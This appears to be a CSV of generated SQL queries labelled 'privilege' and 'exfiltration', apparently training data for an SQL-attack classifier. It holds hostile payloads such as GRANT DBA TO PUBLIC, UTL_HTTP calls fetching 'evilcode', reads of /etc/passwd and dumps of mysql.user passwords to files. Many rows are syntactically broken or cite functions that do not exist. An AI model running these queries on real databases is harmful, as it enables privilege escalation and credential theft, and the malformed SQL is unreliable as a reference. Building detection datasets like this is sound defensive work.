query,label,label_name,source
"SELECT SYS_CONTEXT('USERENV', 'SESSIONID') FROM DUAL;",3,privilege,generated_groq_oracle_simple
CREATE OR REPLACE PROCEDURE DBMS_SCHEDULER.ADD_JOB_ARGUMENT AS BEGIN DBMS_SCHEDULER.DEFINE_JOB_ARGUMENT('my_arg'); END;,3,privilege,generated_groq_oracle_simple
ALTER USER my_user PROFILE DEFAULT;,3,privilege,generated_groq_oracle_simple
"SELECT SYS_CONTEXT('USERENV', 'SID') FROM DUAL;",3,privilege,generated_groq_oracle_simple
"BEGIN DBMS_SCHEDULER.CREATE_JOB('my_job', 'my_procedure'); END;",3,privilege,generated_groq_oracle_simple
SELECT DBA_SCHEDULER_JOBS FROM DBA_SCHEDULER_JOBS;,3,privilege,generated_groq_oracle_simple
"CREATE OR REPLACE PROCEDURE UTL_FILE.GET_LINE AS BEGIN UTL_FILE.GET_LINE('tmp', 'my_line'); END;",3,privilege,generated_groq_oracle_simple
"DECLARE @s VARCHAR2(4000); BEGIN DBMS_SQL.RETURN_RESULT(DBMS_SQL.TO_REFCURSOR(DBMS_SQL.PARSE(NULL, 'SELECT * FROM table_name', 1))); END;",3,privilege,generated_groq_oracle_advanced
DECLARE @x NUMBER := 1; BEGIN FOR i IN (SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 100) LOOP DBMS_OUTPUT.PUT_LINE(@x); END LOOP; END;,3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.FOPEN('/var/tmp/file.txt', 'w') FROM DUAL;",3,privilege,generated_groq_oracle_advanced
DECLARE @x NUMBER := UTL_HTTP.REQ(URL => 'http://example.com/executable'); @y NUMBER := UTL_HTTP.RESPONSE_GET_DATA(); DBMS_OUTPUT.PUT_LINE(@y); END;,3,privilege,generated_groq_oracle_advanced
"BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'job_name', job_type => 'PLSQL_CODE', job_action => 'BEGIN DBMS_OUTPUT.PUT_LINE(2+2); END;', enabled => TRUE, start_date => SYSTIMESTAMP, repeat_interval => NULL); END;",3,privilege,generated_groq_oracle_advanced
SELECT * FROM table_name WHERE rowid = (SELECT MAX(rowid) FROM table_name);,3,privilege,generated_groq_oracle_advanced
"DECLARE @x NUMBER := 1; @y NUMBER := 1 / @x; BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/var/tmp/file.txt', 'a'), '@y'||CHR(10)); END;",3,privilege,generated_groq_oracle_advanced
SELECT * FROM table_name EXCEPT SELECT * FROM table_name WHERE rowid < (SELECT MAX(rowid) FROM table_name);,3,privilege,generated_groq_oracle_advanced
"DECLARE @x NUMBER := 1; @y NUMBER := @x * (SELECT MAX(rowid) FROM table_name); BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/var/tmp/file.txt', 'a'), '@y'||CHR(10)); END;",3,privilege,generated_groq_oracle_advanced
"BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'job_name', job_type => 'PLSQL_CODE', job_action => 'BEGIN DBMS_OUTPUT.PUT_LINE(5*5); END;', repeat_interval => 'FREQ=DAILY;BYHOUR=23;BYMINUTE=59', enabled => TRUE, start_date => SYSTIMESTAMP); END;",3,privilege,generated_groq_oracle_advanced
SELECT * FROM table_name WHERE rowid = (SELECT MIN(rowid) FROM table_name WHERE 1=2 OR 1=1);,3,privilege,generated_groq_oracle_advanced
SELECT * FROM SYS.ALL_TABLES WHERE TABLE_NAME = (SELECT TABLE_NAME FROM DUAL WHERE 1=2 OR 1=1);,3,privilege,generated_groq_oracle_advanced
"DECLARE @x NUMBER := 1; BEGIN FOR i IN (SELECT LEVEL FROM DUAL CONNECT BY LEVEL <= 100) LOOP DBMS_OUTPUT.PUT_LINE(UTL_FILE.FOPEN('/var/tmp/file.txt', 'a')); END LOOP; END;",3,privilege,generated_groq_oracle_advanced
"BEGIN DBMS_SCHEDULER.CREATE_JOB(job_name => 'job_name', job_type => 'PLSQL_CODE', job_action => 'BEGIN DBMS_OUTPUT.PUT_LINE(10/2); END;', enabled => TRUE, start_date => SYSTIMESTAMP); END;",3,privilege,generated_groq_oracle_advanced
SELECT * FROM (SELECT LEVEL AS col FROM DUAL CONNECT BY LEVEL <= 100) WHERE col = (SELECT MAX(col) FROM (SELECT LEVEL AS col FROM DUAL CONNECT BY LEVEL <= 100));,3,privilege,generated_groq_oracle_advanced
"DECLARE @x NUMBER := UTL_HTTP.REQ(URL => 'http://example.com/executable'); @y NUMBER := UTL_HTTP.RESPONSE_GET_DATA(); BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('/var/tmp/file.txt', 'a'), '@y'||CHR(10)); END;",3,privilege,generated_groq_oracle_advanced
"SELECT * FROM table_name WHERE MOD(rowid, 10) = (SELECT MIN(rowid) FROM table_name);",3,privilege,generated_groq_oracle_advanced
SELECT * FROM SYS.ALL_TABLES WHERE OWNER = (SELECT OWNER FROM DUAL WHERE 1=2 OR 1=1);,3,privilege,generated_groq_oracle_advanced
SELECT DBMS_RLF.SQL_HUMANIZE(sql_text) FROM SYS.ALL_STORED_SETTINGS WHERE name = 'SECURITY_SESSIONS' AND password = (SELECT password FROM v$pwfile_users WHERE name = 'SECURITY_SESSIONS'),3,privilege,generated_groq_oracle_advanced
SELECT DBMS_LDAP.bind_sasl FROM dual,3,privilege,generated_groq_oracle_advanced
"SELECT DBMS_SCHEDULER.run_job( job_name => 'SCHEDULER_JOB', instance => 1) FROM dual",3,privilege,generated_groq_oracle_advanced
SELECT (SELECT text FROM SYS.V_$SQL WHERE sql_id = (SELECT sql_id FROM SYS.ALL_SQLAREA where name = 'SQL_FILE_READ')) FROM dual,3,privilege,generated_groq_oracle_advanced
SELECT (SELECT text FROM SYS.V_$SQLAREA WHERE name = (SELECT sql_text FROM SYS.ALL_VIEWS WHERE view_name = 'SQL_FILE_READ')) FROM dual,3,privilege,generated_groq_oracle_advanced
SELECT DBMS_JOB.run_job( job_name => 'JOB_FILE_READ') FROM dual,3,privilege,generated_groq_oracle_advanced
"DECLARE l_file UTL_FILE.FILE_TYPE; BEGIN l_file := UTL_FILE.FOPEN('D:ile.txt', 'w'); UTL_FILE.PUT_LINE(l_file, 'Hello World'); UTL_FILE.FCLOSE(l_file); END;",3,privilege,generated_groq_oracle_advanced
"INSERT INTO sys.all_v_$sql (sql_id, sql_text) SELECT 1, (SELECT text FROM sys.v_$sql WHERE sql_id = (SELECT sql_id FROM sys.all_sqlarea where name = 'SQL_FILE_READ')) FROM dual",3,privilege,generated_groq_oracle_advanced
"SELECT DBMS_SCHEDULER.createJob( job_name => 'SCHEDULER_JOB', job_type => 'PLSQL_BLOCK', job_action => (SELECT text FROM sys.v_$sql WHERE sql_id = (SELECT sql_id FROM sys.all_sqlarea where name = 'SQL_FILE_READ')) FROM dual",3,privilege,generated_groq_oracle_advanced
"BEGIN DBMS_SCHEDULER.create_job( job_name => 'SCHEDULER_JOB', job_type => 'PLSQL_BLOCK', job_action => 'BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('D:ile.txt', 'w'), 'Hello World'); END;'); END;",3,privilege,generated_groq_oracle_advanced
"SELECT dbms_ldap.connect( dblink => 'LDAP://example.com', username => 'uid=guest,cn=users,dc=example,dc=com', password => 'guest') FROM dual",3,privilege,generated_groq_oracle_advanced
SELECT DBMS_XDB.CREATEXMLSCHEMA('http://example.com/XMLSchema.xsd') FROM dual,3,privilege,generated_groq_oracle_advanced
"SELECT DBMS_CDC_VSN.create_cdc( snm => 'snm_file_read', scn=> sysdate) FROM dual",3,privilege,generated_groq_oracle_advanced
CREATE OR REPLACE PROCEDURE test AS BEGIN DBMS_RLF.SQL_HUMANIZE(sql_text) FROM SYS.ALL_STORED_SETTINGS WHERE name = 'SECURITY_SESSIONS' AND value = (SELECT value FROM v$pwfile_users WHERE name = 'SECURITY_SESSIONS'); END;,3,privilege,generated_groq_oracle_advanced
"BEGIN DBMS_SCHEDULER.create_job( job_name => 'SCHEDULER_JOB', job_type => 'PLSQL_BLOCK', job_action => 'BEGIN UTL_FILE.PUT_LINE(UTL_FILE.FOPEN('D:ile.txt', '')) FROM dual') FROM dual",3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!');",3,privilege,generated_groq_oracle_advanced
SELECT UTL_HTTP.REQUEST('http://example.com')</SELECT>,3,privilege,generated_groq_oracle_advanced
"SELECT DBMS_SCHEDULER.RUN_JOB('SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL')",3,privilege,generated_groq_oracle_advanced
"CREATE OR REPLACE PROCEDURE test AS BEGIN UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!'); END;",3,privilege,generated_groq_oracle_advanced
"SELECT * FROM (SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL) WHERE 1=1",3,privilege,generated_groq_oracle_advanced
"WITH test AS (SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL) SELECT * FROM test",3,privilege,generated_groq_oracle_advanced
"SELECT SYS_REFCNCTAG FROM (SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL) WHERE 1=1",3,privilege,generated_groq_oracle_advanced
"CREATE OR REPLACE PROCEDURE test AS BEGIN DBMS_SCHEDULER.RUN_JOB('SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL'); END;",3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL UNION SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL",3,privilege,generated_groq_oracle_advanced
GRANT DBA TO PUBLIC; SELECT * FROM SYS.ALL_TABLES,3,privilege,generated_groq_oracle_advanced
"GRANT CREATE ANY PROCEDURE TO PUBLIC; SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL UNION SELECT UTL_FILE.PUT_LINE('C:\Windows\Temp\test.txt', 'Hello World!') FROM DUAL",3,privilege,generated_groq_oracle_advanced
SELECT * FROM SYS.ALL_TABLES EXCEPT SELECT * FROM SYS.ALL_TABLES,3,privilege,generated_groq_oracle_advanced
WITH test AS (SELECT * FROM SYS.ALL_TABLES) SELECT * FROM SYS.ALL_TABLES INTERSECT SELECT * FROM test,3,privilege,generated_groq_oracle_advanced
CREATE OR REPLACE PROCEDURE test AS BEGIN UTL_HTTP.REQUEST('http://example.com'); END;,3,privilege,generated_groq_oracle_advanced
GRANT CREATE ANY PROCEDURE TO PUBLIC; CREATE OR REPLACE PROCEDURE test AS BEGIN UTL_HTTP.REQUEST('http://example.com'); END;,3,privilege,generated_groq_oracle_advanced
SELECT DBMS_SCHEDULER.RUN_JOB('CREATE OR REPLACE PROCEDURE test AS BEGIN UTL_HTTP.REQUEST('http://example.com'); END;'),3,privilege,generated_groq_oracle_advanced
SELECT SYS_REFCNCTAG FROM (SELECT UTL_HTTP.REQUEST('http://example.com')) WHERE 1=1,3,privilege,generated_groq_oracle_advanced
WITH test AS (SELECT UTL_HTTP.REQUEST('http://example.com')) SELECT * FROM test INTERSECT SELECT UTL_HTTP.REQUEST('http://example.com'),3,privilege,generated_groq_oracle_advanced
"DECLARE @var NUMBER:=1; BEGIN DBMS_SCHEDULER.create_job('job1', 'begin sys.dbms_job.submit((SELECT DBMS_SCHEDULER.run_job(''job1'', NULL)); END;'); END;",3,privilege,generated_groq_oracle_advanced
WITH RECURSIVE x AS (SELECT 1 FROM DUAL UNION ALL SELECT 1 FROM x) SELECT * FROM x ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROW ONLY;,3,privilege,generated_groq_oracle_advanced
"SELECT * FROM (SELECT ROWNUM, SYS_CONNECT_BY_PATH(ID, '/') AS PATH FROM (SELECT 1 AS ID FROM DUAL CONNECT BY LEVEL <= 10)) WHERE LEVEL > 1 AND PATH LIKE '%/%';",3,privilege,generated_groq_oracle_advanced
SELECT DBA_SYS_PRIVS FROM DUAL WHERE 1=1 UNION ALL SELECT DBA_SYS_PRIVS FROM DUAL WHERE 1=1 UNION ALL SELECT DBA_SYS_PRIVS FROM DUAL WHERE 1=1;,3,privilege,generated_groq_oracle_advanced
"EXEC UTL_FILE.fopen('test', 'w');",3,privilege,generated_groq_oracle_advanced
DECLARE l SYS_REFCURSOR; BEGIN OPEN l FOR SELECT DBA_OBJECTS FROM DUAL; END;,3,privilege,generated_groq_oracle_advanced
DBMS_SQL.TO_REFCURSOR(DBMS_SQL.OPEN_CURSOR) FROM DUAL;,3,privilege,generated_groq_oracle_advanced
"DECLARE l SYS_REFCURSOR; BEGIN OPEN l FOR EXEC DBMS_SCHEDULER.create_job('job1', 'begin sys.dbms_job.submit((SELECT DBMS_SCHEDULER.run_job(''job1'', NULL)); END;'); END;l",3,privilege,generated_groq_oracle_advanced
SELECT * FROM TABLE(DBMS_XDB.DIRLISTING('file:///etc/passwd'));,3,privilege,generated_groq_oracle_advanced
DECLARE l SYS_REFCURSOR; BEGIN OPEN l FOR SELECT DBA_DB_LINKS FROM DUAL; END;l,3,privilege,generated_groq_oracle_advanced
SELECT DBA_ROLE_PRIVS FROM DUAL WHERE 1=1 UNION ALL SELECT DBA_ROLE_PRIVS FROM DUAL WHERE 1=1 UNION ALL SELECT DBA_ROLE_PRIVS FROM DUAL WHERE 1=1;,3,privilege,generated_groq_oracle_advanced
"DBMS_SCHEDULER.create_job('JOB1', 'BEGIN EXECUTE IMMEDIATE ''CREATE TABLE test(id INT PRIMARY KEY)''; END;');",3,privilege,generated_groq_oracle_advanced
SELECT DBA_TAB_PRIVS FROM DUAL WHERE 1=1 UNION ALL SELECT DBA_TAB_PRIVS FROM DUAL WHERE 1=1 UNION ALL SELECT DBA_TAB_PRIVS FROM DUAL WHERE 1=1;,3,privilege,generated_groq_oracle_advanced
SELECT * FROM DBA_PROCEDURES WHERE 1=1 UNION ALL SELECT * FROM DBA_PROCEDURES WHERE 1=1 UNION ALL SELECT * FROM DBA_PROCEDURES WHERE 1=1;,3,privilege,generated_groq_oracle_advanced
"WITH RECURSIVE x AS (SELECT 1 FROM DUAL UNION ALL SELECT 1 FROM x) SELECT * FROM (SELECT ROWNUM, x FROM x) WHERE LEVEL > 1 AND ROWNUM = 1;",3,privilege,generated_groq_oracle_advanced
"DBMS_SCHEDULER.create_job('JOB1', 'BEGIN DBMS_SCHEDULER.run_job(''JOB1'', NULL); END;');",3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.FOPEN('C:\fakefile.txt','w') FROM DUAL",3,privilege,generated_groq_oracle_advanced
"SELECT DBMS_SCHEDULER.CREATE_JOB('fakejob','BEGIN UTL_FILE.WRITELINE('C:\fakefile.txt','evilcode'); END;') FROM DUAL",3,privilege,generated_groq_oracle_advanced
SELECT UTL_HTTP.REQUEST('http://example.com/evilcode') FROM DUAL,3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.FOPEN('C:\fakefile.txt','a') FROM DUAL;CREATE PROCEDURE P AS BEGIN UTL_FILE.WRITELINE('C:\fakefile.txt','evilcode'); END; ",3,privilege,generated_groq_oracle_advanced
SELECT UTL_HTTP.REQUEST('http://example.com/evilcode');GRANT EXECUTE ON P TO PUBLIC; ,3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.FOPEN('C:\fakefile.txt','a');CREATE OR REPLACE PROCEDURE P AS BEGIN UTL_FILE.WRITELINE('C:\fakefile.txt','evilcode'); END; ",3,privilege,generated_groq_oracle_advanced
"WITH RECURSIVE CTE AS (SELECT LEVEL AS LEVEL, 'C:/Windows/system32/cmd.exe /c ping 192.168.1.100 /s 10K ' AS EvilCode FROM DUAL CONNECT BY LEVEL<=10) SELECT UTL_HTTP.REQUEST(CTE.EvilCode) FROM CTE",3,privilege,generated_groq_oracle_advanced
"SELECT UTL_FILE.FOPEN('C:\fakefile.txt','a');EXEC DBMS_SCHEDULER.CREATE_JOB('fakejob','BEGIN UTL_FILE.WRITELINE('C:\fakefile.txt','evilcode'); END;')",3,privilege,generated_groq_oracle_advanced
WITH CTE AS (SELECT 'C:/Windows/system32/cmd.exe /c ping 192.168.1.100 /s 10K ' AS EvilCode FROM DUAL) SELECT UTL_HTTP.REQUEST(CTE.EvilCode) FROM CTE,3,privilege,generated_groq_oracle_advanced
"WITH RECURSIVE CTE AS (SELECT LEVEL AS LEVEL, 'C:/Windows/system32/cmd.exe /c ' AS EvilCode FROM DUAL CONNECT BY LEVEL<=10) SELECT UTL_HTTP.REQUEST(CTE.EvilCode || 'system call') FROM CTE",3,privilege,generated_groq_oracle_advanced
"SELECT UTL_HTTP.REQUEST(' http://example.com/evilcode');CREATE PROCEDURE P AS BEGIN UTL_FILE.WRITELINE('C:\fakefile.txt','evilcode'); END; ",3,privilege,generated_groq_oracle_advanced
"SELECT UTL_HTTP.REQUEST('http://example.com/evilcode /C:\Windows\system32\cmd.exe');CREATE OR REPLACE PROCEDURE P AS BEGIN UTL_FILE.WRITELINE('C:\fakefile.txt','evilcode'); END; ",3,privilege,generated_groq_oracle_advanced
"WITH RECURSIVE CTE AS (SELECT LEVEL AS LEVEL, 'C:\Windows\system32\cmd.exe /c ' AS EvilCode FROM DUAL CONNECT BY LEVEL<=10) SELECT UTL_FILE.WRITELINE('C:\fakefile.txt',CTE.EvilCode || 'system call'); ",3,privilege,generated_groq_oracle_advanced
SELECT * FROM mysql.user INTO OUTFILE '/var/log/database.dump';,4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.tables;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(Host SEPARATOR ',') FROM mysql.user;",4,exfiltration,generated_groq_mysql_simple
UNION SELECT * FROM information_schema.columns;,4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.schemata;,4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.processlist;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(Variable_name SEPARATOR ',') FROM information_schema.server_status;",4,exfiltration,generated_groq_mysql_simple
UNION SELECT * FROM information_schema.table_stats;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(COLUMN_NAME SEPARATOR ',') FROM information_schema.columns WHERE TABLE_NAME = 'users';",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.triggers;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(ENGINE SEPARATOR ',') FROM information_schema.table_stats;",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.views;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM information_schema.statistics;",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM mysql.event;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM information_schema.key_column_usage;",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.innodb_table_stats;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(INDEX_NAME SEPARATOR ',') FROM information_schema.statistics;",4,exfiltration,generated_groq_mysql_simple
UNION SELECT * FROM information_schema.general_log;,4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.plugin;,4,exfiltration,generated_groq_mysql_simple
"SELECT GROUP_CONCAT(TABLE_NAME SEPARATOR ',') FROM information_schema.table_constraints;",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM information_schema.user_variables;,4,exfiltration,generated_groq_mysql_simple
"SELECT * FROM mysql.user INTO OUTFILE '/var/tmp/user_dump.csv' FIELDS TERMINATED BY ',';",4,exfiltration,generated_groq_mysql_simple
"SELECT * FROM information_schema.columns INTO OUTFILE '/var/tmp/columns_dump.csv' FIELDS TERMINATED BY ',';",4,exfiltration,generated_groq_mysql_simple
LOAD_FILE('/etc/passwd');,4,exfiltration,generated_groq_mysql_simple
SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables GROUP BY table_schema;,4,exfiltration,generated_groq_mysql_simple
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables;,4,exfiltration,generated_groq_mysql_simple
"SELECT CONCAT(table_schema, '.', table_name) FROM information_schema.tables;",4,exfiltration,generated_groq_mysql_simple
SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.Columns WHERE table_name='mysql.user';,4,exfiltration,generated_groq_mysql_simple
"SELECT CONCAT(COLUMN_NAME, '=', COLUMN_DEFAULT) FROM information_schema.Columns WHERE table_name='mysql.user';",4,exfiltration,generated_groq_mysql_simple
"SELECT table_schema, GROUP_CONCAT(table_name) FROM information_schema.tables GROUP BY table_schema;",4,exfiltration,generated_groq_mysql_simple
"SELECT table_schema, GROUP_CONCAT(COLUMN_NAME) FROM information_schema.Columns GROUP BY table_schema;",4,exfiltration,generated_groq_mysql_simple
SELECT GROUP_CONCAT(table_schema) FROM information_schema.tables WHERE table_name='mysql.user';,4,exfiltration,generated_groq_mysql_simple
SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema='mysql';,4,exfiltration,generated_groq_mysql_simple
SELECT table_name FROM information_schema.tables LIMIT 10000 OFFSET 0;,4,exfiltration,generated_groq_mysql_simple
"SELECT *, 1 AS col1 FROM (SELECT * FROM information_schema.tables LIMIT 1) AS a UNION SELECT *, 2 AS col1 FROM (SELECT * FROM information_schema.tables LIMIT 1) AS b;",4,exfiltration,generated_groq_mysql_simple
"SELECT CONCAT(LOWER(table_schema), '.', table_name) AS table_name FROM information_schema.tables WHERE table_schema NOT IN (SELECT table_schema FROM information_schema.tables WHERE table_name='mysql.user') AND table_name NOT IN (SELECT table_name FROM mysql.user);",4,exfiltration,generated_groq_mysql_simple
"SELECT table_schema, GROUP_CONCAT(table_name ORDER BY table_name ASC SEPARATOR '|') FROM information_schema.tables GROUP BY table_schema ORDER BY table_schema ASC;",4,exfiltration,generated_groq_mysql_simple
"SELECT table_schema, GROUP_CONCAT(COLUMN_NAME ORDER BY table_name ASC SEPARATOR '|') FROM information_schema.Columns GROUP BY table_schema ORDER BY table_schema ASC;",4,exfiltration,generated_groq_mysql_simple
"SELECT CONCAT('SELECT * FROM ', GROUP_CONCAT(table_schema ORDER BY table_schema ASC SEPARATOR ' UNION ALL SELECT * FROM '), ';') FROM information_schema.tables GROUP BY table_schema;",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM mysql.user INTO OUTFILE '/var/log/user.txt',4,exfiltration,generated_groq_mysql_simple
LOAD_FILE('/var/log/user.txt'),4,exfiltration,generated_groq_mysql_simple
"SELECT user, password FROM mysql.user",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM mysql.user WHERE host = 'localhost',4,exfiltration,generated_groq_mysql_simple
SELECT GROUP_CONCAT(LOAD_FILE('/var/log/pass.txt')),4,exfiltration,generated_groq_mysql_simple
"SELECT user, host FROM mysql.user",4,exfiltration,generated_groq_mysql_simple
SELECT * FROM mysql.db,4,exfiltration,generated_groq_mysql_simple
